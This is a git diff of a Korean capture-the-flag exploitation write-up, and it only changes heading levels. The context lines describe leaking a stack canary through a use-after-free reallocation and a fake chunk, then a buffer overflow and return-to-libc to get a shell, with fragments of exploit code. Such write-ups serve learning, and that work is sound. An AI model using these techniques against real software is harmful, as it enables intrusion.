@@ -182,7 +182,7 @@ time.sleep(SLEEP_TICK)
 sess1.broadcast(1)
 ```
 
-### 4.2.2. Leak canary
+#### 4.2.2. Leak canary
 마지막으로 free했던 주소가 다시 할당되므로, 새 node의 `title`을 malloc 할 때 1번째 노드의 주소가 할당되고, 이 데이터가 `title`로 넣어준 값으로 수정된다.
 
 fake chunk를 만드는데 strlen 등으로 인해 title에 null byte 포함하는것이 불가능하다.
@@ -221,7 +221,7 @@ canary = u32(b'\x00' + movie_list.split(b'Titile : ')[1].split(b'\n')[0][0:3])
 print(f"Canary: {hex(canary)}")
 ```
 
-### 4.2.3. Get shell
+#### 4.2.3. Get shell
 
 이제 canary 값을 구했으니 다시 BOF를 한 뒤, RTL을 한다.
 
